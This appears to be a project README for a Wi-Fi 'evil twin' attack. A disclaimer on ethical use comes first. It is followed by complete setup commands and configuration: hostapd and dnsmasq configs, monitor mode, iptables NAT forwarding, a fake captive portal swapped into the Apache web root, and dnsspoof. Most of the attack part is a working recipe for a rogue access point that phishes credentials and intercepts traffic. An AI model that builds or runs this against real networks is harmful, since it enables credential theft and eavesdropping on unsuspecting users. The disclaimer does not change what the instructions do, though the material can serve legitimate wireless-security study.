# Warning: Ethical Use of Evil Twin Attacks

---

## Notice to Users:

The Evil Twin Attack Project has been developed for educational and research purposes only. Its primary aim is to aid in the understanding and prevention of wireless security threats by demonstrating the techniques used in such attacks. However, it is crucial to adhere to the following guidelines to ensure ethical and legal use of this tool.

### Strictly Prohibited Actions:

1. **Unauthorized Access:**
   - Do not use this tool to gain unauthorized access to any wireless network.
   - Never use this tool on any network without explicit permission from the network owner.

2. **Data Theft:**
   - Do not use this tool to intercept or steal data from any user or device connected to a wireless network.

3. **Privacy Violations:**
   - Respect the privacy of individuals. Do not monitor, capture, or manipulate communications of others without their consent.

4. **Disruption of Services:**
   - Do not use this tool to disrupt, disable, or otherwise interfere with the normal operation of any network or device.

### Legal Consequences:

Engaging in the activities listed above is illegal and punishable by law. Unauthorized access to computer systems, theft of data, and network disruptions can lead to severe penalties, including fines and imprisonment.

### Ethical Guidelines:

- **Research and Education:**
  - Use this tool solely for research and educational purposes, such as learning about wireless security, testing your own networks, or developing security measures to protect against such attacks.
  
- **Responsible Disclosure:**
  - If you discover vulnerabilities while using this tool, responsibly disclose them to the affected parties so they can take appropriate measures to secure their systems.

### User Responsibility:

By using this tool, you agree to abide by all applicable laws and ethical guidelines. You acknowledge that any misuse of this tool is solely your responsibility, and the creators of the tool are not liable for any unethical or illegal actions taken by users.

---

**Remember:**
Security research should always be conducted responsibly and ethically, with the goal of making networks and systems safer for everyone.

---


 # Preparing:

	apt-get update

	apt-get install hostapd dnsmasq apache2 

	airmon-ng start wlan0

	mkdir ~/fake-ap //Your working Directory

	cd ~/fake-ap

  ### ---You can change the styling of your HTML file according to you.---


# Create config files

 
	nano hostapd.conf 

 ## Instructions for hostapd.conf: 

  interface=[INTERFACE NAME]

  driver=nl80211

  ssid=[WiFi NAME]

  hw_mode=g

  channel=8

  macaddr_acl=0

  ignore_broadcast_ssid=0


	nano dnsmasq.conf

 ## Instructions for dnsmasq.conf: 

interface=[INTERFACE NAME]

dhcp-range=192.168.1.2, 192.168.1.30, 255.255.255.0, 12h

dhcp-option=3, 192.168.1.1

dhcp-option=6, 192.168.1.1

server=8.8.8.8

log-queries

log-dhcp

listen-address=127.0.0.1


 ## Routing table and gateway:

	ifconfig wlan0mon up 192.168.1.1 netmask 255.255.255.0
	route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1

 ## Internet access:

	iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
	iptables --append FORWARD --in-interface wlan0mon -j ACCEPT
	echo 1 > /proc/sys/net/ipv4/ip_forward

 	
## Captive portal setup:
	
	rm -rf /var/www/html/*
	
	mv ~/fake-ap-captive-portal/. /var/www/html
	
	cd /var/www/html
		
	service apache2 start
	

 # --- Start the attack on different terminals ---: 

	hostapd hostapd.conf

	dnsmasq -C dnsmasq.conf -d

	dnsspoof -i wlan0mon

	
